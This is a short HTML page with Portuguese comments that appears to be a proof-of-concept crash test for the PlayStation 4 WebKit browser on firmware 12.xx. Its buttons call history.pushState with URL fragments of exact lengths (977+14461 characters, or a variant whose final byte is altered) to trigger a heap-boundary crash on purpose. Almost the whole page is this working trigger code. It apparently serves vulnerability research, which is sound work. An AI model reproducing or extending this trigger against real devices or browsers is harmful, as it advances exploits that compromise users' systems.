<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit history.pushState Heap Boundary Test</title>
</head>
<body>

<h1>PS4 WebKit – history.pushState Heap Boundary Test</h1>
<p>FW alvo: 12.xx</p>
<p><b>ATENÇÃO:</b> Este teste causa crash proposital.</p>

<button onclick="test_safe()">TEST SAFE (977 + 14460)</button><br><br>
<button onclick="test_crash_size()">TEST CRASH (977 + 14461)</button><br><br>
<button onclick="test_crash_byte()">TEST CRASH (byte final alterado)</button>

<pre id="log"></pre>

<script>
function log(msg) {
    document.getElementById("log").textContent += msg + "\n";
}

/*
 * CONSTRUÇÃO EXATA DO PAYLOAD
 * NÃO adicionar prefixos
 * NÃO concatenar partes extras
 * NÃO usar objetos
 */

function makePayload(len1, len2, lastByte=null) {
    let p = "A".repeat(len1) + "A".repeat(len2);

    if (lastByte !== null) {
        p = p.slice(0, -1) + lastByte;
    }

    return p;
}

function push(payload) {
    log("Payload length: " + payload.length);
    history.pushState({}, "", "#" + payload);
    log("pushState retornou (se você está vendo isso, não crashou)");
}

/* ============================
 * TESTES
 * ============================ */

function test_safe() {
    log("\n[SAFE TEST]");
    const p = makePayload(977, 14460);
    push(p);
}

function test_crash_size() {
    log("\n[CRASH SIZE TEST]");
    const p = makePayload(977, 14461);
    push(p);
}

function test_crash_byte() {
    log("\n[CRASH BYTE VARIATION TEST]");
    const p = makePayload(977, 14461, "B");
    push(p);
}
</script>

</body>
</html>
